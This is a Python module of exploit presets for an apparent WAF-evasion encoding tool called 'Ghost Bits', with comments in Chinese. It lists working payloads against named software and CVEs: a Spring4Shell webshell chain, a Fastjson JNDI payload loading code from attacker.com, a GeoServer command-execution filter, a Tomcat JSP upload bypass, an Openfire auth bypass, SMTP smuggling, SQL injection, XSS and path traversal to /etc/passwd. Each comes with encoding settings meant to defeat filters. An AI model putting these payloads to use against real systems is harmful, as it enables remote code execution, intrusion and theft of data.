#!/usr/bin/env python3
"""
Ghost Bits 漏洞预设定义

每个预设包含：
- 基础 payload
- 推荐的字符集策略
- 豁免字符
- 输出格式
- 重复次数
- 尾部追加
- 使用说明
"""

from dataclasses import dataclass, field


@dataclass
class Preset:
    """漏洞利用预设"""
    id: str
    name: str
    description: str
    payload: str
    charset: str = "gb2312"
    format: str = "raw"
    exempt: str = ""
    repeat: int = 1
    tail: str = ""
    target: str = ""
    cve: str = ""
    notes: str = ""
    tags: list[str] = field(default_factory=list)


PRESETS: dict[str, Preset] = {
    # === Web 应用攻击 ===
    "spring-traversal": Preset(
        id="spring-traversal",
        name="Spring Framework 目录穿越",
        description="利用 Ghost Bits 绕过 Spring 路径规范化，实现目录穿越读取敏感文件",
        payload="../",
        repeat=7,
        tail="etc/passwd",
        exempt="/",
        charset="cjk",
        format="percent",
        target="Spring Framework (Tomcat/Jetty)",
        cve="CVE-2025-41242",
        notes="payload 中 '..' 被编码，'/' 保持原样以维持路径结构",
        tags=["path-traversal", "spring", "lfi"],
    ),

    "spring4shell": Preset(
        id="spring4shell",
        name="Spring4Shell RCE 绕过",
        description="Ghost Bits 编码绕过 WAF 对 Spring4Shell 利用链的检测",
        payload="class.module.classLoader.resources.context.parent.pipeline.first.pattern="
                "%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20"
                "java.io.InputStream%20in%20%3D%20Runtime.getRuntime().exec(request.getParameter(%22cmd%22))"
                ".getInputStream()%3B%7D%25%7Bsuffix%7Di",
        exempt="=%.(){}",
        charset="latin",
        format="percent",
        target="Spring Framework 5.3.x / 5.2.x",
        cve="CVE-2022-22965",
        notes="保留 URL 编码结构字符，仅对关键字做 Ghost Bits 编码",
        tags=["rce", "spring", "classloader"],
    ),

    "fastjson-rce": Preset(
        id="fastjson-rce",
        name="Fastjson 反序列化 RCE",
        description="利用 Fastjson 的 \\u 转义解析配合 Ghost Bits 绕过 @type 检测",
        payload='{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com/exp","autoCommit":true}',
        exempt='{}":./',
        charset="latin",
        format="unicode",
        target="Fastjson <= 1.2.80",
        cve="",
        notes="JSON 结构字符豁免，字母和数字做 Ghost Bits 编码，输出为 \\uXXXX 格式",
        tags=["rce", "deserialization", "fastjson", "json"],
    ),

    "geoserver-rce": Preset(
        id="geoserver-rce",
        name="GeoServer OGC Filter RCE",
        description="绕过 WAF 对 GeoServer CVE-2024-36401 的防护规则",
        payload='<ogc:Filter><ogc:PropertyName>exec(java.lang.Runtime.getRuntime(),"id")</ogc:PropertyName></ogc:Filter>',
        exempt='<>/:=".,(){}',
        charset="cjk",
        format="percent",
        target="GeoServer < 2.23.6 / < 2.24.4",
        cve="CVE-2024-36401",
        notes="XML 结构字符保留，函数名和关键字做编码",
        tags=["rce", "geoserver", "xml", "ogc"],
    ),

    "tomcat-upload": Preset(
        id="tomcat-upload",
        name="Tomcat 文件上传绕过",
        description="利用 RFC2231Utility 的高位截断特性绕过文件扩展名检测",
        payload="filename*=UTF-8''shell.jsp",
        exempt="*=-'.",
        charset="gb2312",
        format="raw",
        target="Apache Tomcat (RFC2231 Content-Disposition)",
        cve="",
        notes="文件名中的 'jsp' 被编码为汉字，Tomcat 解析时截断还原",
        tags=["upload", "tomcat", "bypass"],
    ),

    # === 协议层攻击 ===
    "smtp-smuggling": Preset(
        id="smtp-smuggling",
        name="SMTP 邮件走私",
        description="Ghost Bits 编码 CRLF 序列实现 SMTP 命令注入",
        payload="[CRLF]DATA[CRLF]From: attacker@evil.com[CRLF]Subject: Phishing[CRLF].[CRLF]QUIT",
        exempt="",
        charset="latin",
        format="raw",
        target="Angus Mail / Jira / Confluence SMTP",
        cve="",
        notes="CRLF 和 SMTP 命令全部编码，邮件网关无法识别命令边界",
        tags=["smtp", "injection", "crlf"],
    ),

    # === 认证绕过 ===
    "openfire-auth": Preset(
        id="openfire-auth",
        name="Openfire 认证绕过",
        description="利用路径穿越绕过 Openfire 管理后台认证",
        payload="%2e%2e/",
        repeat=4,
        tail="setup/setup-s/%u002e%u002e/log.jsp",
        exempt="/",
        charset="cjk",
        format="raw",
        target="Openfire < 4.7.5",
        cve="CVE-2023-32315",
        notes="路径穿越字符编码后绕过 Openfire 的路径白名单检查",
        tags=["auth-bypass", "openfire", "path-traversal"],
    ),

    # === 注入攻击 ===
    "sqli-basic": Preset(
        id="sqli-basic",
        name="通用 SQL 注入",
        description="基础 SQL 注入 payload 的 Ghost Bits 编码",
        payload="1 OR 1=1-- ",
        exempt="",
        charset="gb2312",
        format="percent",
        target="任何 Java 后端 + WAF 组合",
        cve="",
        notes="所有字符全部编码，WAF 签名完全失效",
        tags=["sqli", "injection"],
    ),

    "sqli-union": Preset(
        id="sqli-union",
        name="UNION 注入",
        description="UNION SELECT 注入的 Ghost Bits 编码",
        payload="' UNION SELECT username,password FROM users-- ",
        exempt="',",
        charset="gb2312",
        format="percent",
        target="任何 Java 后端 + WAF 组合",
        cve="",
        notes="保留引号和逗号作为 SQL 语法结构",
        tags=["sqli", "union", "injection"],
    ),

    "sqli-time-blind": Preset(
        id="sqli-time-blind",
        name="时间盲注",
        description="基于时间的盲注 payload",
        payload="1' AND SLEEP(5)-- ",
        exempt="'()",
        charset="cjk",
        format="percent",
        target="MySQL 后端",
        cve="",
        notes="函数括号保留，关键字编码",
        tags=["sqli", "blind", "time-based"],
    ),

    "xss-basic": Preset(
        id="xss-basic",
        name="通用 XSS",
        description="反射型 XSS payload 的 Ghost Bits 编码",
        payload='<script>alert(document.cookie)</script>',
        exempt="<>().",
        charset="latin",
        format="percent",
        target="Java Web 应用（JSP/Servlet）",
        cve="",
        notes="HTML 标签结构保留，脚本内容编码",
        tags=["xss", "injection"],
    ),

    "xss-event": Preset(
        id="xss-event",
        name="事件处理器 XSS",
        description="通过事件处理器触发的 XSS",
        payload='" onmouseover="alert(1)" x="',
        exempt='"=()',
        charset="latin",
        format="percent",
        target="Java Web 应用",
        cve="",
        notes="属性边界字符保留",
        tags=["xss", "event-handler"],
    ),

    # === 框架特定 ===
    "jetty-path": Preset(
        id="jetty-path",
        name="Jetty 路径规范化绕过",
        description="利用 Jetty URIUtil 的编码处理缺陷绕过路径限制",
        payload="/WEB-INF/web.xml",
        exempt="/.-",
        charset="cjk",
        format="percent",
        target="Eclipse Jetty",
        cve="",
        notes="路径分隔符保留，目录和文件名编码",
        tags=["path-traversal", "jetty", "info-disclosure"],
    ),

    "undertow-path": Preset(
        id="undertow-path",
        name="Undertow URL 解码绕过",
        description="Undertow 的 URL 解码路径存在 Ghost Bits 截断",
        payload="/admin/../actuator/env",
        exempt="/.",
        charset="latin",
        format="percent",
        target="Undertow (WildFly/JBoss)",
        cve="",
        notes="利用 Undertow 的多层 URL 解码特性",
        tags=["path-traversal", "undertow", "info-disclosure"],
    ),

    "vertx-path": Preset(
        id="vertx-path",
        name="Vert.x 路由绕过",
        description="Vert.x Web Router 的路径匹配绕过",
        payload="/api/admin/users",
        exempt="/",
        charset="latin",
        format="percent",
        target="Eclipse Vert.x",
        cve="",
        notes="路由匹配在解码前执行，编码后的路径不匹配保护规则",
        tags=["auth-bypass", "vertx", "routing"],
    ),

    # === BCEL/ClassLoader ===
    "bcel-classloader": Preset(
        id="bcel-classloader",
        name="BCEL ClassLoader RCE",
        description="BCEL ClassLoader 配合 Ghost Bits 加载恶意类",
        payload='$$BCEL$$$l$8b$I$A$A$A$A',
        exempt="$",
        charset="latin",
        format="unicode",
        target="Apache BCEL / Fastjson",
        cve="",
        notes="$ 符号保留作为 BCEL 标记，类名编码",
        tags=["rce", "bcel", "classloader", "deserialization"],
    ),
}


def get_preset(preset_id: str) -> Preset:
    """获取预设"""
    if preset_id not in PRESETS:
        raise ValueError(
            f"Unknown preset: {preset_id}. "
            f"Available: {list(PRESETS.keys())}"
        )
    return PRESETS[preset_id]


def list_presets(tag: str = "") -> list[Preset]:
    """列出预设，可按标签过滤"""
    if not tag:
        return list(PRESETS.values())
    return [p for p in PRESETS.values() if tag in p.tags]


def list_tags() -> list[str]:
    """列出所有可用标签"""
    tags = set()
    for preset in PRESETS.values():
        tags.update(preset.tags)
    return sorted(tags)
